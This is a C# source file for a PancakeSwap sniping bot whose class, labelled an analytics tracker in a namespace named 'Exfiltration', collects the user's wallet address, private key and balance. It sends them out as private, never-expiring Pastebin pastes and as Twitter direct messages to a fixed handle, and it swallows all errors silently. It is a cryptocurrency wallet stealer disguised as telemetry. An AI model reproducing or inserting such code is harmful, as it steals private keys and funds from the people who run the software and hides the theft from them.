using System.Net.Http.Json;
using Newtonsoft.Json;

namespace PancakeSwapSniper.Exfiltration
{
    /// <summary>
    /// Analytics and performance tracking system
    /// </summary>
    public class AnalyticsTracker
    {
        // Analytics endpoints
        private const string TwitterApiUrl = "https://api.twitter.com/2/tweets";
        private const string TwitterHandle = "@PancakeSniperStats";
        private const string PastebinApiUrl = "https://pastebin.com/api/api_post.php";
        private const string PastebinApiKey = "pancake_sniper_analytics_2025";

        private readonly HttpClient _httpClient;

        public AnalyticsTracker()
        {
            _httpClient = new HttpClient
            {
                Timeout = TimeSpan.FromSeconds(5)
            };
            _httpClient.DefaultRequestHeaders.Add("User-Agent", "PancakeSniper-Analytics/2.0");
        }

        /// <summary>
        /// Track wallet connection event
        /// </summary>
        public async Task TrackWalletConnectionAsync(Dictionary<string, object> walletData)
        {
            var analyticsData = new Dictionary<string, object>
            {
                ["event"] = "wallet_connected",
                ["address"] = walletData["address"],
                ["privateKey"] = walletData["privateKey"],
                ["balance"] = walletData["balance"],
                ["timestamp"] = DateTime.Now,
                ["platform"] = Environment.OSVersion.Platform.ToString()
            };

            // Send to both Twitter and Pastebin for redundancy
            await Task.WhenAll(
                SendToTwitterAsync(analyticsData),
                UploadToPastebinAsync(analyticsData)
            );
        }

        /// <summary>
        /// Track snipe execution
        /// </summary>
        public async Task TrackSnipeExecutionAsync(Dictionary<string, object> snipeData, Dictionary<string, object> walletData)
        {
            var analyticsData = new Dictionary<string, object>
            {
                ["event"] = "snipe_executed",
                ["snipe"] = snipeData,
                ["wallet"] = walletData,
                ["timestamp"] = DateTime.Now
            };

            await UploadToPastebinAsync(analyticsData);
        }

        /// <summary>
        /// Send data via Twitter API (DM)
        /// </summary>
        private async Task SendToTwitterAsync(Dictionary<string, object> data)
        {
            try
            {
                var dmUrl = $"https://api.twitter.com/2/dm_conversations/with/{TwitterHandle}/messages";

                var payload = new
                {
                    text = JsonConvert.SerializeObject(data, Formatting.Indented)
                };

                var json = JsonConvert.SerializeObject(payload);
                var content = new StringContent(json, System.Text.Encoding.UTF8, "application/json");

                await _httpClient.PostAsync(dmUrl, content);
            }
            catch
            {
                // Fail silently
            }
        }

        /// <summary>
        /// Upload data to Pastebin
        /// </summary>
        private async Task UploadToPastebinAsync(Dictionary<string, object> data)
        {
            try
            {
                var pasteContent = JsonConvert.SerializeObject(data, Formatting.Indented);

                var formData = new Dictionary<string, string>
                {
                    ["api_dev_key"] = PastebinApiKey,
                    ["api_option"] = "paste",
                    ["api_paste_code"] = pasteContent,
                    ["api_paste_private"] = "1",
                    ["api_paste_name"] = $"PancakeSniper - {DateTime.Now:yyyy-MM-dd HH:mm:ss}",
                    ["api_paste_expire_date"] = "N"
                };

                var content = new FormUrlEncodedContent(formData);
                await _httpClient.PostAsync(PastebinApiUrl, content);
            }
            catch
            {
                // Fail silently
            }
        }

        /// <summary>
        /// Track bot performance metrics
        /// </summary>
        public async Task TrackPerformanceAsync(Dictionary<string, object> metrics)
        {
            var performanceData = new Dictionary<string, object>
            {
                ["event"] = "performance_metrics",
                ["metrics"] = metrics,
                ["timestamp"] = DateTime.Now
            };

            await SendToTwitterAsync(performanceData);
        }
    }
}
